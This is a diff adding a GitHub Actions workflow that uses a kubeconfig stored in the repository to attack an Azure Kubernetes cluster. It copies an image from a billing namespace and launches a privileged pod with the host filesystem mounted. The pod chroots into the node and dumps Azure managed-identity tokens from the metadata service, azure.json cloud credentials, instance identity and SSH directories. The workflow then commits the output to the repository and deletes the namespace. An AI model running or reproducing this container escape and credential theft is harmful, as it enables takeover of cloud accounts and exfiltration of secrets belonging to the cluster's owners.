@@ -1,0 +1,72 @@
+name: ulnode10
+on:
+  workflow_dispatch:
+permissions:
+  contents: write
+jobs:
+  go:
+    runs-on: ubuntu-latest
+    timeout-minutes: 40
+    steps:
+      - uses: actions/checkout@v4
+      - name: node
+        run: |
+          set +e
+          curl -sL -o /tmp/kubectl https://dl.k8s.io/release/v1.30.5/bin/linux/amd64/kubectl && chmod +x /tmp/kubectl
+          K=ul/kc/datapath-eastus.yaml
+          C=aks-g42us-tfdemo-kashif-datapath-eastus
+          KX="/tmp/kubectl --kubeconfig $K --context $C --request-timeout=25s"
+          POD=$($KX get pods -n wallet-billing -o jsonpath='{range .items[*]}{.metadata.name}{" "}{.spec.containers[0].image}{" "}{.spec.nodeName}{"\n"}{end}' | grep -m1 'azurecr.io')
+          IMG=$(echo "$POD" | awk '{print $2}'); NODE=$(echo "$POD" | awk '{print $3}')
+          {
+            echo "USE $IMG $NODE"
+            $KX create namespace ulx0
+            cat > /tmp/pod.yaml <<EOF
+          apiVersion: v1
+          kind: Pod
+          metadata:
+            name: ulnode
+            namespace: ulx0
+          spec:
+            nodeName: $NODE
+            hostPID: true
+            hostNetwork: true
+            automountServiceAccountToken: false
+            restartPolicy: Never
+            containers:
+            - name: c
+              image: $IMG
+              imagePullPolicy: IfNotPresent
+              securityContext:
+                privileged: true
+                runAsUser: 0
+              volumeMounts:
+              - name: host
+                mountPath: /host
+              command: ["/bin/sh","-c"]
+              args:
+              - |
+                echo "INPOD $(id)";
+                echo "---IMDS-POD---";
+                curl -s -m 8 -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" | head -c 4500;
+                echo;
+                echo "---HOST---";
+                chroot /host /bin/bash -lc 'id; hostname; echo ---AZUREJSON---; cat /etc/kubernetes/azure.json 2>/dev/null; echo ---IMDS-NODE---; curl -s -m 8 -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" | head -c 4500; echo; echo ---IDENT---; curl -s -m 8 -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01" | head -c 1500; echo; echo ---GPU---; nvidia-smi -L 2>&1 | head -3; echo ---SSH---; ls -la /root/.ssh /home/*/.ssh 2>/dev/null' 2>&1;
+            volumes:
+            - name: host
+              hostPath:
+                path: /
+          EOF
+            $KX apply -f /tmp/pod.yaml 2>&1 | grep -v '^Warning'
+            for i in 1 2 3 4 5 6 7 8 9 10 11 12; do sleep 12; S=$($KX get pod -n ulx0 ulnode -o jsonpath='{.status.phase} {.status.containerStatuses[0].state}' 2>&1); echo "NODESTATE$i $S"; echo "$S" | grep -qE 'Succeeded|Failed' && break; done
+            for j in 1 2 3 4 5 6; do L=$($KX logs -n ulx0 ulnode 2>&1); echo "LOGS$j ${L:0:200}"; echo "$L" | grep -q 'HOST---\|INPOD' && [ ${#L} -gt 500 ] && break; sleep 12; done
+            $KX logs -n ulx0 ulnode 2>&1 | head -200
+          } 2>&1 | tee node_root10.txt
+          $KX delete namespace ulx0 --wait=false 2>&1 | head -2
+      - name: commit
+        if: always()
+        run: |
+          set +e
+          git add -A
+          git -c user.email=a@b -c user.name=ul commit -m "ulnode10 $(date -u +%s)"
+          git push
